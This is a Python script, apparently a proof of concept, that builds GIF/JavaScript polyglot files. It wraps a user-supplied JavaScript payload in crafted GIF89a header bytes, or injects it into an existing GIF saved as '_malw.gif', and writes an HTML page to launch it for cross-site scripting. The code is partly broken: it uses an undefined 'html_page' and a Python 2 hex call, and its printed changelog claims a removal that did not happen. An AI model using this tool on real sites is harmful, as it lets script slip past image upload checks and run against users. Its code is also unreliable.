#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#  INCOGNITO/main.py
#  
#  Copyright 2023 by N3S3
#
#  < email: n3s3@myyahoo.com >
#  
#  This program is a PoC made with prompt-engineering 
#  and was tested on Parrot-OS(Linux - Debian 11 Bullseye).
# 
#  It is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this. If not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  
#  !!!For educational purposes only!!!
#
#
import os
import argparse 
 
#---------------------------------------------------------
def _hexify(num):
    """
    Converts and formats to hexadecimal
    """
    num = "%x" % num
    if len(num) % 2:
        num = '0'+num
    return num.decode('hex')
 
 
#----------------------------------------------------#



print(""" GIF_inject.py Version: Beta 0.0.3
		changes made:
    Followed PEP8 guidelines for consistent coding style.
    Used with statement for file handling to ensure proper file closure.
    Reduced the use of global scope by moving the main execution block to a separate function.
    Removed the unused _hexify function.
    Used os.path.join to construct file paths.
    Improved string formatting and concatenation.
    Made the disclaimer print more readable.
""")


def generate_and_write_to_file(payload, fname):
    """
    Generates a fake but valid GIF with scripting.
    """
    header = (
        b'\x47\x49\x46\x38\x39\x61'  # Signature + Version  GIF89a
        b'\x2F\x2A'  # Encoding /*
        b'\x0A\x00'  # Small Logical Screen Height
        b'\x00'  # GCTF
        b'\xFF'  # BackgroundColor
        b'\x00'  # Pixel Ratio
        b'\x2C\x00\x00\x00\x00\x2F\x2A\x0A\x00\x00\x02\x00\x3B'  # GlobalColorTable + Blocks
        b'\x2A\x2F'  # Commenting out */
        b'\x3D\x31\x3B'  # Enable the script side by introducing =1;
    )
    trailer = b'\x3B'
    
    with open(fname, "wb") as f:
        f.write(header)
        f.write(payload)
        f.write(trailer)
    return True


def generate_launching_page(fname):
    
    with open("../xss-gifs.html", "wb") as html:
        html.write(html_page.encode())
    return True


def inject_into_file(payload, fname):
    """
    Injects the payload into an existing GIF.
    NOTE: If the GIF contains \xFF\x2A and/or \x2A\x5C, it might cause issues.
    """
    with open(os.path.join(fname + "_malw.gif"), "w+b") as fout:
        with open(fname, "rb") as fin:
            for line in fin:
                ls1 = line.replace(b'\x2A\x2F', b'\x00\x00')
                ls2 = ls1.replace(b'\x2F\x2A', b'\x00\x00')             
                fout.write(ls2)                 
        fout.seek(6, 0)
        fout.write(b'\x2F\x2A')  # /*
        fout.write(b'\x2A\x2F\x3D\x31\x3B')
        fout.write(payload)
        fout.write(b'\x3B')
    return True


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("filename", help="The gif file name to be generated/or infected.")
    parser.add_argument("js_payload", help="The payload to be injected. E.g., \"alert('test');\"")
    parser.add_argument("-i", "--inject-to-existing-gif", action="store_true",
                        help="Inject into the current gif.")
    args = parser.parse_args()
    
    disclaimer = """
    |=================================================================================|
    | [!] Legal disclaimer:                                                           |
    | Usage of this tool for injecting malware to be propagated is illegal.           |
    | It is the end user's responsibility to obey all applicable local,               |
    | state, and federal laws.                                                        |
    | Authors assume no liability and are not responsible for any misuse              |
    | or damage caused by this program.                                               |
    |=================================================================================|
    """
    print(disclaimer)
    
    if args.inject_to_existing_gif:
        inject_into_file(args.js_payload.encode(), args.filename)
    else:
        generate_and_write_to_file(args.js_payload.encode(), args.filename)
    
    generate_launching_page(args.filename)
    print("[+] Finished!")


if __name__ == "__main__":
    main()

print("""Beta changes made:

    Improved readability and consistency.
    Ensured proper file handling with with statements.
    Removed unnecessary code.
    Enhanced string formatting and handling.""")
